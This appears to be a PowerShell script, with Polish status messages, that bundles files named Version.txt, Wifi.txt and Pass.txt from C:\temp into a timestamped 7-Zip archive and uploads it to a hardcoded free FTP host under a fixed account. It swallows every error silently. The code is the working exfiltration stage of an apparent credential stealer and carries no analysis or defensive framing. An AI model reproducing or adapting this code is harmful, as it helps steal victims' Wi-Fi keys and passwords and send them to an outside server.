function Create7z {
    $tempFolder = "C:\temp"
    if (-not (Test-Path $tempFolder)) {
        return
    }

    $filesToArchive = @(
        "C:\temp\Version.txt",
        "C:\temp\Wifi.txt",
        "C:\temp\Pass.txt"
    )

    foreach ($file in $filesToArchive) {
        if (-not (Test-Path $file)) {
            return
        }
    }

    $zipPath = "$tempFolder\7z.zip"
    if (-not (Test-Path $zipPath)) {
        Write-Host "Pobieranie 7za920.zip..."
        Invoke-WebRequest -Uri "https://www.7-zip.org/a/7za920.zip" -OutFile $zipPath
    }

    $extractedFolder = "$tempFolder\7z"
    if (-not (Test-Path $extractedFolder)) {
        Write-Host "Rozpakowywanie 7za920.zip..."
        Expand-Archive -Path $zipPath -DestinationPath $extractedFolder
    }

    $sevenZipPath = "$extractedFolder\7za.exe"
    
    if (-not (Test-Path $sevenZipPath)) {
        return
    }

    $timestamp = Get-Date -Format "yyyyMMdd_HHmm"
    $archivePath = "$tempFolder\tom$timestamp.7z"

    $arguments = @("a", "`"$archivePath`"")
    foreach ($file in $filesToArchive) {
        $arguments += "`"$file`""
    }

    try {
        & $sevenZipPath $arguments
    }
    catch {
    }
}

function UploadFTP {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$file,

        [parameter(Position=1, Mandatory=$False)]
        [string]$ftpServer = "ftp://ftp.byethost33.com",

        [parameter(Position=2, Mandatory=$False)]
        [string]$ftpUser = "b33_37902659",

        [parameter(Position=3, Mandatory=$False)]
        [string]$ftpPass = $CodeFTP,

        [parameter(Position=4, Mandatory=$False)]
        [string]$ftpDir = "/htdocs/temp"
    )

    if (-not ([string]::IsNullOrEmpty($file))) {
        if (-not (Test-Path $file)) {
            return
        }
        try {
            $ftpUri = [System.Uri]::new($ftpServer + $ftpDir + "/" + [System.IO.Path]::GetFileName($file))

            $ftpRequest = [System.Net.FtpWebRequest]::Create($ftpUri)
            $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
            $ftpRequest.Credentials = [System.Net.NetworkCredential]::new($ftpUser, $ftpPass)
            $ftpRequest.UseBinary = $true
            $ftpRequest.UsePassive = $true

            $fileBytes = [System.IO.File]::ReadAllBytes($file)

            $ftpStream = $ftpRequest.GetRequestStream()
            $ftpStream.Write($fileBytes, 0, $fileBytes.Length)
            $ftpStream.Close()
        }
        catch {
        }
    }
    else {
    }
}

function Up7z {
  $files = Get-ChildItem -Path "C:\temp" -Filter "tom*.7z"

  foreach ($file in $files) {
    try {
        # Sprawdzenie, czy plik istnieje przed próbą przesyłania
        if (Test-Path $file.FullName) {
            UploadFTP -file $file.FullName
            UploadFTP -file "C:\temp\TEST.7z"
        } else {
            Write-Host "Plik $($file.Name) nie istnieje, pomijam..."
        }
    }
    catch {
        Write-Host "Wystąpił błąd podczas próby przesyłania pliku: $($file.FullName)"
    }
}
}



